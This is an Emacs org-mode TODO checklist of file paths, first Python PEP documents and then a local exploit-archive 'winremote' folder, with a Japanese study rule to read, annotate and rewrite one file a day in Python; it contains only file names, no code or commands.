**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0348.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0349.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0350.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0351.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0352.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0353.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0354.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0355.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0356.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0357.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0358.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0359.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0360.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0361.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0362.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0363.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0364.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0365.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0366.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0367.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0368.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0369.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0370.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0371.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0372.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0373.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0374.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0375.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0376.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0377.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0378.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0379.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0380.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0381.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0382.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0383.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0384.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0385.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0386.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0387.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0389.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0390.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0391.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0392.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0393.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0394.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0395.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0396.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0397.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0398.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0399.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0400.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0401.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0402.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0403.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0404.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0405.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0406.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0407.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0408.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0409.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0410.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0411.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0412.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0413.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0414.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0415.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0416.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0417.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0418.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0419.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0420.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0421.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0422.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0423.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0424.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0425.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0426.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0427.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0428.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0429.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0430.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0431.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0432.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0433.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0434.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0435.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0436.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0444.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0628.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0666.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0754.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3000.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3001.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3002.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3003.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3099.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3100.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3101.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3102.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3103.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3104.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3105.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3106.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3107.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3108.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3109.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3110.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3111.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3112.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3113.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3114.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3115.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3116.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3117.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3118.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3119.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3120.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3121.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3122.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3123.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3124.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3125.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3126.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3127.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3128.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3129.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3130.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3131.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3132.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3133.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3134.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3135.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3136.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3137.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3138.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3139.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3140.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3141.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3142.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3143.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3144.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3145.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3146.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3147.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3148.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3149.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3150.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3151.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3152.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3153.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3154.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3155.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3156.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-3333.txt

*** exploitdb [0/2214]
   - Rule
# 一日 1 file source を読む
# source を読み改善できるところは改善する
# 説明を付ける
# python で書き直す

**** TODO file:/root/work/exploitdb/winremote/10007.html
**** TODO file:/root/work/exploitdb/winremote/10008.txt
**** TODO file:/root/work/exploitdb/winremote/10047.txt
**** TODO file:/root/work/exploitdb/winremote/10053.txt
**** TODO file:/root/work/exploitdb/winremote/10054.txt
**** TODO file:/root/work/exploitdb/winremote/10056.py
**** TODO file:/root/work/exploitdb/winremote/10070.php
**** TODO file:/root/work/exploitdb/winremote/10073.py
**** TODO file:/root/work/exploitdb/winremote/10079.txt
**** TODO file:/root/work/exploitdb/winremote/10080.txt
**** TODO file:/root/work/exploitdb/winremote/10098.py
**** TODO file:/root/work/exploitdb/winremote/10099.py
**** TODO file:/root/work/exploitdb/winremote/100.c
**** TODO file:/root/work/exploitdb/winremote/10162.py
**** TODO file:/root/work/exploitdb/winremote/10235.py
**** TODO file:/root/work/exploitdb/winremote/10258.pl
**** TODO file:/root/work/exploitdb/winremote/10269.html
**** TODO file:/root/work/exploitdb/winremote/1026.cpp
**** TODO file:/root/work/exploitdb/winremote/1028.c
**** TODO file:/root/work/exploitdb/winremote/10340.pl
**** TODO file:/root/work/exploitdb/winremote/1035.c
**** TODO file:/root/work/exploitdb/winremote/10365.rb
**** TODO file:/root/work/exploitdb/winremote/10375.html
**** TODO file:/root/work/exploitdb/winremote/10380.pl
**** TODO file:/root/work/exploitdb/winremote/10394.py
**** TODO file:/root/work/exploitdb/winremote/103.c
**** TODO file:/root/work/exploitdb/winremote/10434.py
**** TODO file:/root/work/exploitdb/winremote/10542.py
**** TODO file:/root/work/exploitdb/winremote/1066.cpp
**** TODO file:/root/work/exploitdb/winremote/10715.rb
**** TODO file:/root/work/exploitdb/winremote/1075.c
**** TODO file:/root/work/exploitdb/winremote/10765.py
**** TODO file:/root/work/exploitdb/winremote/10791.py
**** TODO file:/root/work/exploitdb/winremote/1079.html
**** TODO file:/root/work/exploitdb/winremote/1089.c
**** TODO file:/root/work/exploitdb/winremote/10911.py
**** TODO file:/root/work/exploitdb/winremote/1096.txt
**** TODO file:/root/work/exploitdb/winremote/10973.py
**** TODO file:/root/work/exploitdb/winremote/1099.pl
**** TODO file:/root/work/exploitdb/winremote/109.c
**** TODO file:/root/work/exploitdb/winremote/11027.pl
**** TODO file:/root/work/exploitdb/winremote/1102.html
**** TODO file:/root/work/exploitdb/winremote/11059.html
**** TODO file:/root/work/exploitdb/winremote/1108.pl
**** TODO file:/root/work/exploitdb/winremote/11138.c
**** TODO file:/root/work/exploitdb/winremote/11151.html
**** TODO file:/root/work/exploitdb/winremote/1115.pl
**** TODO file:/root/work/exploitdb/winremote/11167.py
**** TODO file:/root/work/exploitdb/winremote/11172.html
**** TODO file:/root/work/exploitdb/winremote/11173.txt
**** TODO file:/root/work/exploitdb/winremote/11179.rb
**** TODO file:/root/work/exploitdb/winremote/1118.c
**** TODO file:/root/work/exploitdb/winremote/11204.html
**** TODO file:/root/work/exploitdb/winremote/11210.rb
**** TODO file:/root/work/exploitdb/winremote/11220.py
**** TODO file:/root/work/exploitdb/winremote/11257.rb
**** TODO file:/root/work/exploitdb/winremote/11272.py
**** TODO file:/root/work/exploitdb/winremote/11293.py
**** TODO file:/root/work/exploitdb/winremote/112.c
**** TODO file:/root/work/exploitdb/winremote/1130.c
**** TODO file:/root/work/exploitdb/winremote/1131.c
**** TODO file:/root/work/exploitdb/winremote/11328.py
**** TODO file:/root/work/exploitdb/winremote/1132.c
**** TODO file:/root/work/exploitdb/winremote/11420.py
**** TODO file:/root/work/exploitdb/winremote/11422.rb
**** TODO file:/root/work/exploitdb/winremote/1144.html
**** TODO file:/root/work/exploitdb/winremote/11453.py
**** TODO file:/root/work/exploitdb/winremote/11457.pl
**** TODO file:/root/work/exploitdb/winremote/11468.py
**** TODO file:/root/work/exploitdb/winremote/1146.c
**** TODO file:/root/work/exploitdb/winremote/1147.pm
**** TODO file:/root/work/exploitdb/winremote/1149.c
**** TODO file:/root/work/exploitdb/winremote/11500.py
**** TODO file:/root/work/exploitdb/winremote/1150.pm
**** TODO file:/root/work/exploitdb/winremote/1151.pm
**** TODO file:/root/work/exploitdb/winremote/1152.pm
**** TODO file:/root/work/exploitdb/winremote/11539.py
**** TODO file:/root/work/exploitdb/winremote/11618.pl
**** TODO file:/root/work/exploitdb/winremote/11650.c
**** TODO file:/root/work/exploitdb/winremote/11661.txt
**** TODO file:/root/work/exploitdb/winremote/11668.rb
**** TODO file:/root/work/exploitdb/winremote/11683.rb
**** TODO file:/root/work/exploitdb/winremote/11694.txt
**** TODO file:/root/work/exploitdb/winremote/116.c
**** TODO file:/root/work/exploitdb/winremote/11742.rb
**** TODO file:/root/work/exploitdb/winremote/11750.html
**** TODO file:/root/work/exploitdb/winremote/11765.txt
**** TODO file:/root/work/exploitdb/winremote/1178.c
**** TODO file:/root/work/exploitdb/winremote/1179.c
**** TODO file:/root/work/exploitdb/winremote/117.c
**** TODO file:/root/work/exploitdb/winremote/1180.c
**** TODO file:/root/work/exploitdb/winremote/11820.pl
**** TODO file:/root/work/exploitdb/winremote/1183.c
**** TODO file:/root/work/exploitdb/winremote/1184.c
**** TODO file:/root/work/exploitdb/winremote/11857.c
**** TODO file:/root/work/exploitdb/winremote/11877.py
**** TODO file:/root/work/exploitdb/winremote/11879.txt
**** TODO file:/root/work/exploitdb/winremote/11886.py
**** TODO file:/root/work/exploitdb/winremote/1190.c
**** TODO file:/root/work/exploitdb/winremote/1193.pl
**** TODO file:/root/work/exploitdb/winremote/11973.txt
**** TODO file:/root/work/exploitdb/winremote/11974.py
**** TODO file:/root/work/exploitdb/winremote/119.c
**** TODO file:/root/work/exploitdb/winremote/1201.pl
**** TODO file:/root/work/exploitdb/winremote/12044.c
**** TODO file:/root/work/exploitdb/winremote/1210.pm
**** TODO file:/root/work/exploitdb/winremote/12117.txt
**** TODO file:/root/work/exploitdb/winremote/12119.pl
**** TODO file:/root/work/exploitdb/winremote/12152.pl
**** TODO file:/root/work/exploitdb/winremote/12156.txt
**** TODO file:/root/work/exploitdb/winremote/121.c
**** TODO file:/root/work/exploitdb/winremote/12202.html
**** TODO file:/root/work/exploitdb/winremote/12203.html
**** TODO file:/root/work/exploitdb/winremote/1223.c
**** TODO file:/root/work/exploitdb/winremote/12244.html
**** TODO file:/root/work/exploitdb/winremote/12244.txt
**** TODO file:/root/work/exploitdb/winremote/12247.html
**** TODO file:/root/work/exploitdb/winremote/12248.html
**** TODO file:/root/work/exploitdb/winremote/1224.html
**** TODO file:/root/work/exploitdb/winremote/12250.html
**** TODO file:/root/work/exploitdb/winremote/12308.txt
**** TODO file:/root/work/exploitdb/winremote/12309.txt
**** TODO file:/root/work/exploitdb/winremote/12310.txt
**** TODO file:/root/work/exploitdb/winremote/12312.rb
**** TODO file:/root/work/exploitdb/winremote/12320.txt
**** TODO file:/root/work/exploitdb/winremote/12331.txt
**** TODO file:/root/work/exploitdb/winremote/12332.pl
**** TODO file:/root/work/exploitdb/winremote/12367.html
**** TODO file:/root/work/exploitdb/winremote/12380.pl
**** TODO file:/root/work/exploitdb/winremote/123.c
**** TODO file:/root/work/exploitdb/winremote/12417.py
**** TODO file:/root/work/exploitdb/winremote/1243.c
**** TODO file:/root/work/exploitdb/winremote/12480.txt
**** TODO file:/root/work/exploitdb/winremote/12495.pl
**** TODO file:/root/work/exploitdb/winremote/12498.txt
**** TODO file:/root/work/exploitdb/winremote/124.pl
**** TODO file:/root/work/exploitdb/winremote/12511.txt
**** TODO file:/root/work/exploitdb/winremote/12512.py
**** TODO file:/root/work/exploitdb/winremote/12573.html
**** TODO file:/root/work/exploitdb/winremote/12580.txt
**** TODO file:/root/work/exploitdb/winremote/12581.txt
**** TODO file:/root/work/exploitdb/winremote/12582.txt
**** TODO file:/root/work/exploitdb/winremote/1260.pm
**** TODO file:/root/work/exploitdb/winremote/12614.txt
**** TODO file:/root/work/exploitdb/winremote/1262.pm
**** TODO file:/root/work/exploitdb/winremote/1264.pl
**** TODO file:/root/work/exploitdb/winremote/12657.txt
**** TODO file:/root/work/exploitdb/winremote/12663.html
**** TODO file:/root/work/exploitdb/winremote/12673.txt
**** TODO file:/root/work/exploitdb/winremote/1277.c
**** TODO file:/root/work/exploitdb/winremote/1279.pm
**** TODO file:/root/work/exploitdb/winremote/127.pl
**** TODO file:/root/work/exploitdb/winremote/12815.txt
**** TODO file:/root/work/exploitdb/winremote/12834.py
**** TODO file:/root/work/exploitdb/winremote/130.c
**** TODO file:/root/work/exploitdb/winremote/1313.c
**** TODO file:/root/work/exploitdb/winremote/1330.c
**** TODO file:/root/work/exploitdb/winremote/1332.pm
**** TODO file:/root/work/exploitdb/winremote/133.pl
**** TODO file:/root/work/exploitdb/winremote/1352.cpp
**** TODO file:/root/work/exploitdb/winremote/1357.diff
**** TODO file:/root/work/exploitdb/winremote/135.c
**** TODO file:/root/work/exploitdb/winremote/1365.pm
**** TODO file:/root/work/exploitdb/winremote/1366.pm
**** TODO file:/root/work/exploitdb/winremote/136.pl
**** TODO file:/root/work/exploitdb/winremote/1374.pl
**** TODO file:/root/work/exploitdb/winremote/1375.pl
**** TODO file:/root/work/exploitdb/winremote/1378.py
**** TODO file:/root/work/exploitdb/winremote/13808.txt
**** TODO file:/root/work/exploitdb/winremote/1380.py
**** TODO file:/root/work/exploitdb/winremote/13818.txt
**** TODO file:/root/work/exploitdb/winremote/1381.pm
**** TODO file:/root/work/exploitdb/winremote/13822.txt
**** TODO file:/root/work/exploitdb/winremote/13834.html
**** TODO file:/root/work/exploitdb/winremote/13903.py
**** TODO file:/root/work/exploitdb/winremote/1391.pm
**** TODO file:/root/work/exploitdb/winremote/13932.py
**** TODO file:/root/work/exploitdb/winremote/14013.txt
**** TODO file:/root/work/exploitdb/winremote/1408.pl
**** TODO file:/root/work/exploitdb/winremote/1413.c
**** TODO file:/root/work/exploitdb/winremote/1414.pl
**** TODO file:/root/work/exploitdb/winremote/14179.txt
**** TODO file:/root/work/exploitdb/winremote/1417.pl
**** TODO file:/root/work/exploitdb/winremote/14180.py
**** TODO file:/root/work/exploitdb/winremote/14181.py
**** TODO file:/root/work/exploitdb/winremote/14182.py
**** TODO file:/root/work/exploitdb/winremote/14194.cpp
**** TODO file:/root/work/exploitdb/winremote/14195.html
**** TODO file:/root/work/exploitdb/winremote/14200.html
**** TODO file:/root/work/exploitdb/winremote/1420.c
**** TODO file:/root/work/exploitdb/winremote/1421.cpp
**** TODO file:/root/work/exploitdb/winremote/14222.py
**** TODO file:/root/work/exploitdb/winremote/14248.py
**** TODO file:/root/work/exploitdb/winremote/14257.py
**** TODO file:/root/work/exploitdb/winremote/14267.txt
**** TODO file:/root/work/exploitdb/winremote/14269.html
**** TODO file:/root/work/exploitdb/winremote/14275.txt
**** TODO file:/root/work/exploitdb/winremote/14287.cpp
**** TODO file:/root/work/exploitdb/winremote/14309.html
**** TODO file:/root/work/exploitdb/winremote/14321.html
**** TODO file:/root/work/exploitdb/winremote/14385.html
**** TODO file:/root/work/exploitdb/winremote/14399.py
**** TODO file:/root/work/exploitdb/winremote/14400.py
**** TODO file:/root/work/exploitdb/winremote/14402.py
**** TODO file:/root/work/exploitdb/winremote/14412.rb
**** TODO file:/root/work/exploitdb/winremote/14416.html
**** TODO file:/root/work/exploitdb/winremote/14447.html
**** TODO file:/root/work/exploitdb/winremote/14451.rb
**** TODO file:/root/work/exploitdb/winremote/1448.pl
**** TODO file:/root/work/exploitdb/winremote/14492.c
**** TODO file:/root/work/exploitdb/winremote/14496.py
**** TODO file:/root/work/exploitdb/winremote/14505.html
**** TODO file:/root/work/exploitdb/winremote/14514.html
**** TODO file:/root/work/exploitdb/winremote/14519.html
**** TODO file:/root/work/exploitdb/winremote/14522.rb
**** TODO file:/root/work/exploitdb/winremote/1452.pm
**** TODO file:/root/work/exploitdb/winremote/14539.html
**** TODO file:/root/work/exploitdb/winremote/14547.txt
**** TODO file:/root/work/exploitdb/winremote/14551.html
**** TODO file:/root/work/exploitdb/winremote/14552.html
**** TODO file:/root/work/exploitdb/winremote/14553.html
**** TODO file:/root/work/exploitdb/winremote/14580.html
**** TODO file:/root/work/exploitdb/winremote/14586.html
**** TODO file:/root/work/exploitdb/winremote/1458.cpp
**** TODO file:/root/work/exploitdb/winremote/14599.txt
**** TODO file:/root/work/exploitdb/winremote/14600.html
**** TODO file:/root/work/exploitdb/winremote/14604.py
**** TODO file:/root/work/exploitdb/winremote/14605.html
**** TODO file:/root/work/exploitdb/winremote/1460.pm
**** TODO file:/root/work/exploitdb/winremote/14623.py
**** TODO file:/root/work/exploitdb/winremote/1462.cpp
**** TODO file:/root/work/exploitdb/winremote/1463.pm
**** TODO file:/root/work/exploitdb/winremote/14658.txt
**** TODO file:/root/work/exploitdb/winremote/1466.pl
**** TODO file:/root/work/exploitdb/winremote/14674.txt
**** TODO file:/root/work/exploitdb/winremote/14779.pl
**** TODO file:/root/work/exploitdb/winremote/14853.py
**** TODO file:/root/work/exploitdb/winremote/14856.txt
**** TODO file:/root/work/exploitdb/winremote/14857.txt
**** TODO file:/root/work/exploitdb/winremote/14878.html
**** TODO file:/root/work/exploitdb/winremote/14885.html
**** TODO file:/root/work/exploitdb/winremote/14886.py
**** TODO file:/root/work/exploitdb/winremote/14895.
**** TODO file:/root/work/exploitdb/winremote/14895.py
**** TODO file:/root/work/exploitdb/winremote/149.c
**** TODO file:/root/work/exploitdb/winremote/15001.html
**** TODO file:/root/work/exploitdb/winremote/15016.rb
**** TODO file:/root/work/exploitdb/winremote/1502.py
**** TODO file:/root/work/exploitdb/winremote/15042.py
**** TODO file:/root/work/exploitdb/winremote/15048.txt
**** TODO file:/root/work/exploitdb/winremote/1504.pm
**** TODO file:/root/work/exploitdb/winremote/15056.py
**** TODO file:/root/work/exploitdb/winremote/1505.html
**** TODO file:/root/work/exploitdb/winremote/1506.c
**** TODO file:/root/work/exploitdb/winremote/15071.txt
**** TODO file:/root/work/exploitdb/winremote/15072.rb
**** TODO file:/root/work/exploitdb/winremote/15073.rb
**** TODO file:/root/work/exploitdb/winremote/15168.rb
**** TODO file:/root/work/exploitdb/winremote/151.txt
**** TODO file:/root/work/exploitdb/winremote/1520.pl
**** TODO file:/root/work/exploitdb/winremote/15231.py
**** TODO file:/root/work/exploitdb/winremote/15235.html
**** TODO file:/root/work/exploitdb/winremote/15238.py
**** TODO file:/root/work/exploitdb/winremote/15241.txt
**** TODO file:/root/work/exploitdb/winremote/15266.txt
**** TODO file:/root/work/exploitdb/winremote/15288.txt
**** TODO file:/root/work/exploitdb/winremote/15292.rb
**** TODO file:/root/work/exploitdb/winremote/15296.txt
**** TODO file:/root/work/exploitdb/winremote/15333.txt
**** TODO file:/root/work/exploitdb/winremote/15336.txt
**** TODO file:/root/work/exploitdb/winremote/15337.py
**** TODO file:/root/work/exploitdb/winremote/15347.py
**** TODO file:/root/work/exploitdb/winremote/15349.txt
**** TODO file:/root/work/exploitdb/winremote/15352.html
**** TODO file:/root/work/exploitdb/winremote/15357.php
**** TODO file:/root/work/exploitdb/winremote/15358.txt
**** TODO file:/root/work/exploitdb/winremote/15368.php
**** TODO file:/root/work/exploitdb/winremote/1536.pm
**** TODO file:/root/work/exploitdb/winremote/15371.txt
**** TODO file:/root/work/exploitdb/winremote/15373.txt
**** TODO file:/root/work/exploitdb/winremote/1537.pm
**** TODO file:/root/work/exploitdb/winremote/15421.html
**** TODO file:/root/work/exploitdb/winremote/15427.txt
**** TODO file:/root/work/exploitdb/winremote/15437.txt
**** TODO file:/root/work/exploitdb/winremote/15438.txt
**** TODO file:/root/work/exploitdb/winremote/15445.txt
**** TODO file:/root/work/exploitdb/winremote/15450.txt
**** TODO file:/root/work/exploitdb/winremote/155.c
**** TODO file:/root/work/exploitdb/winremote/15600.html
**** TODO file:/root/work/exploitdb/winremote/15601.html
**** TODO file:/root/work/exploitdb/winremote/15648.html
**** TODO file:/root/work/exploitdb/winremote/15655.html
**** TODO file:/root/work/exploitdb/winremote/15658.rb
**** TODO file:/root/work/exploitdb/winremote/1565.pl
**** TODO file:/root/work/exploitdb/winremote/15668.html
**** TODO file:/root/work/exploitdb/winremote/15689.py
**** TODO file:/root/work/exploitdb/winremote/156.c
**** TODO file:/root/work/exploitdb/winremote/15733.html
**** TODO file:/root/work/exploitdb/winremote/15746.rb
**** TODO file:/root/work/exploitdb/winremote/157.c
**** TODO file:/root/work/exploitdb/winremote/15802.txt
**** TODO file:/root/work/exploitdb/winremote/15809.html
**** TODO file:/root/work/exploitdb/winremote/15834.py
**** TODO file:/root/work/exploitdb/winremote/15861.txt
**** TODO file:/root/work/exploitdb/winremote/15862.txt
**** TODO file:/root/work/exploitdb/winremote/15866.html
**** TODO file:/root/work/exploitdb/winremote/15868.pl
